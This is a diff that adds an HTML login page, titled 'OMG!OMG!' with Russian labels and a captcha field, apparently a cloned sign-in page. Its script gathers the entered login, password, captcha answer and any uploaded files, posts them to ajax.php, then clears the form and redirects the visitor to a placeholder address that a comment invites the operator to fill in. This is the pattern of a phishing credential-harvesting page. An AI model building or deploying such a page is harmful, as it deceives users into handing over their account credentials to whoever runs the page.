@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/x-icon" href="favicon.ico">
+    <script src="https://code.jquery.com/jquery-3.6.0.js"
+    integrity="sha256-H+K7U5CnXl1h5ywQfKtSj8PCmoN9aaq30gDh27Xc0jk=" crossorigin="anonymous"></script>
+    <link href="main.css" rel="stylesheet">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;700&family=Open+Sans:wght@400;500;600;700&family=Ubuntu:wght@400;500;700&display=swap" rel="stylesheet">
+<script src="http://code.jquery.com/jquery-1.8.3.js"></script>
+    <title>OMG!OMG!</title>
+    <script>
+        
+
+ function send(){
+     var login = $('#login').val();
+     var password = $('#password').val();
+     const btn = $('#btn')
+     if(login.length > 3 & password.length > 3){
+        $('.form').on('submit', function (event) {
+
+event.stopPropagation();
+event.preventDefault();
+
+let form = this,
+    submit = $('.submit', form),
+    data = new FormData(),
+    files = $('input[type=file]')
+
+
+$('.submit', form).val('Отправка...');
+$('input, textarea', form).attr('disabled','');
+
+data.append( 'login', 		$('[name="login"]', form).val() );
+                                data.append( 'password', 		$('[name="password"]', form).val() );
+                                data.append( 'capy', 		$('[name="capy"]', form).val() );
+
+files.each(function (key, file) {
+    let cont = file.files;
+    if ( cont ) {
+        $.each( cont, function( key, value ) {
+            data.append( key, value );
+        });
+    }
+});
+
+$.ajax({
+    url: 'ajax.php',
+    type: 'POST',
+    data: data,
+    cache: false,
+    dataType: 'json',
+    processData: false,
+    contentType: false,
+    xhr: function() {
+        let myXhr = $.ajaxSettings.xhr();
+
+        if ( myXhr.upload ) {
+            myXhr.upload.addEventListener( 'progress', function(e) {
+                if ( e.lengthComputable ) {
+                    let percentage = ( e.loaded / e.total ) * 100;
+                        percentage = percentage.toFixed(0);
+                    $('.submit', form)
+                        .html( percentage + '%' );
+                }
+            }, false );
+        }
+
+        return myXhr;
+    },
+    error: function( jqXHR, textStatus ) {
+  
+      
+    },
+    complete: function() {
+        
+        console.log('Complete')
+        form.reset() 
+        // тут вместо  ставь что хочешь 
+        window.location = "https://";
+        
+    }
+});
+return false;
+});
+            
+     }
+ }
+               
+               
+   
+        
+
+    </script>
+</head>
+<body>
+    <div class="header jflex aflex">
+        <img height="36" src="logo-black.svg">
+    </div>
+    <div class="jflex">
+        <div class="content">
+        <div class="padding">
+            <form class="form">
+                <p class="title">Вход</p>
+                <input required  name="login" id="login" autocapitalize="none" placeholder="Логин" class="gen-inp">
+                <input required  name="password" id="password" autocapitalize="none" placeholder="Пароль" class="gen-inp" type="password">
+                <div>
+                    <img class="capy" src="capy.png" alt="">
+                    <input name="capy" id="capy" autocapitalize="none"  class="gen-inp" >
+                    <button type="submit" onclick="send()" class="btn" id="btn" >Вход</button>
+                </div>
+               
+            </form>
+        </div>
+        <div>
+            <div class="footer aflex jflex none"> 
+                <a href="">Регистрация</a>
+                
+            </div>
+            <div class="none-none aflex jflex">
+            <a  href="" class=" link">Регистрация</a>
+        </div>
+        </div>
+    </div>
+</div>
+</body>
+</html>
